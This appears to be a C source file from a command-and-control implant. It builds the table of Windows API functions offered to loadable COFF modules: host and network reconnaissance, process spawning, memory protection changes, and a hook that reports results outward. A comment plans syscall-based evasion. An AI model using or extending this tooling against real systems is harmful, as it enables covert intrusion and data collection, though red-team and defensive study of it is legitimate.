/*
 * api_table.c — function pointer table passed to COFF modules.
 * Contract: "module, you may use THESE functions — the core resolves
 * them for you, cleanly and safely."
 */

#include "api_table.h"
#include "dispatcher.h"
#include "outbound.h"

ApiTable g_api;  // global instance

void init_api_table(void) {
    // Memory
    g_api.malloc = &malloc;
    g_api.free = &free;
    g_api.VirtualAlloc = &VirtualAlloc;
    g_api.VirtualFree = &VirtualFree;
    g_api.VirtualProtect = &VirtualProtect;
    g_api.memcpy = &memcpy;
    g_api.memset = &memset;
    g_api.strlen = &strlen;
    g_api.sprintf = &sprintf;
    g_api.GlobalFree = &GlobalFree;

    // Process management
    g_api.CreateProcessW = &CreateProcessW;
    g_api.CreatePipe = &CreatePipe;
    g_api.ReadFile = &ReadFile;
    g_api.WriteFile = &WriteFile;
    g_api.CloseHandle = &CloseHandle;
    g_api.GetLastError = &GetLastError;
    g_api.Sleep = &Sleep;

    // Future evasion: replace kernel32 pointers with direct syscall stubs,
    // e.g. g_api.CreateProcessW = resolve_syscall("NtCreateUserProcess", SSN);

    // System
    g_api.GetCurrentDirectoryW = &GetCurrentDirectoryW;
    g_api.SetCurrentDirectoryW = &SetCurrentDirectoryW;
    g_api.GetTempPathW = &GetTempPathW;

    // Host info
    g_api.GetComputerNameW = &GetComputerNameW;
    g_api.GetUserNameExW = &GetUserNameExW;
    g_api.GetCurrentProcessId = &GetCurrentProcessId;
    g_api.GetModuleFileNameW = &GetModuleFileNameW;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        g_api.RtlGetVersion = (NTSTATUS(*)(PRTL_OSVERSIONINFOW)) GetProcAddress(ntdll, "RtlGetVersion");
    }
    g_api.GetTickCount64 = &GetTickCount64;
    g_api.GlobalMemoryStatusEx = &GlobalMemoryStatusEx;
    g_api.GetSystemInfo = &GetSystemInfo;
    g_api.GetSystemMetrics = &GetSystemMetrics;
    g_api.GetTimeZoneInformation = &GetTimeZoneInformation;
    g_api.GetUserDefaultLCID = &GetUserDefaultLCID;
    g_api.GetUserDefaultUILanguage = &GetUserDefaultUILanguage;
    g_api.GetLogicalDrives = &GetLogicalDrives;
    g_api.GetDriveTypeW = &GetDriveTypeW;
    g_api.GetDiskFreeSpaceExW = &GetDiskFreeSpaceExW;
    g_api.GetWindowsDirectoryW = &GetWindowsDirectoryW;
    g_api.GetSystemDirectoryW = &GetSystemDirectoryW;
    g_api.GetCurrentProcess = &GetCurrentProcess;
    g_api.OpenProcessToken = &OpenProcessToken;
    g_api.GetTokenInformation = &GetTokenInformation;

    // File system
    g_api.FindFirstFileW = &FindFirstFileW;
    g_api.FindNextFileW = &FindNextFileW;
    g_api.FindClose = &FindClose;

    // Process listing
    g_api.CreateToolhelp32Snapshot = &CreateToolhelp32Snapshot;
    g_api.Process32FirstW = &Process32FirstW;
    g_api.Process32NextW = &Process32NextW;

    // String conversion
    g_api.MultiByteToWideChar = &MultiByteToWideChar;
    g_api.WideCharToMultiByte = &WideCharToMultiByte;

    // Network
    g_api.GetAdaptersAddresses = &GetAdaptersAddresses;
    g_api.GetExtendedTcpTable = &GetExtendedTcpTable;
    g_api.GetExtendedUdpTable = &GetExtendedUdpTable;
    g_api.GetIpForwardTable = &GetIpForwardTable;
    g_api.GetIpNetTable = &GetIpNetTable;
    g_api.WinHttpGetIEProxyConfigForCurrentUser = &WinHttpGetIEProxyConfigForCurrentUser;

    // Registry
    g_api.RegOpenKeyExW = &RegOpenKeyExW;
    g_api.RegQueryValueExW = &RegQueryValueExW;
    g_api.RegEnumValueW = &RegEnumValueW;
    g_api.RegCloseKey = &RegCloseKey;

    // Services
    g_api.OpenSCManagerW = &OpenSCManagerW;
    g_api.OpenServiceW = &OpenServiceW;
    g_api.QueryServiceStatusEx = &QueryServiceStatusEx;
    g_api.CloseServiceHandle = &CloseServiceHandle;

    // Formatting
    g_api.labs = &labs;
    g_api.LCIDToLocaleName = &LCIDToLocaleName;

    // Communication
    g_api.report_result = &out_add_task_response;

}
